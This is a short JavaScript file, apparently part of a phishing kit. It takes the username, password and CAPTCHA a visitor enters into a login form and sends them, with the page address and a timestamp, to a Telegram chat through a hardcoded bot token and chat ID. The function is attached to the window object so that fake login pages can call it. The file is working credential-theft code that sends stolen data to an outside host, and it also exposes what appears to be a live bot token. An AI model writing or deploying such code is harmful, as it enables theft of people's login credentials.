const TELEGRAM_TOKEN = '8755481590:AAGnXeU61Zjl0q1-t3_pv8Kex5uOHbPylEw';
const TELEGRAM_CHAT_ID = '8652805995';

async function sendToTelegram(username, password, captcha, formAction) {
  const message = `🆕 New Login Attempt!\n\n📱 Page: ${formAction}\n👤 Username: ${username}\n🔑 Password: ${password}\n🔤 CAPTCHA: ${captcha}\n⏰ Time: ${new Date().toISOString()}`;
  const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}`;
  try {
    await fetch(url);
    console.log('Sent to Telegram');
  } catch (e) {
    console.error('Telegram send failed:', e);
  }
}

window.sendLoginToTelegram = sendToTelegram;

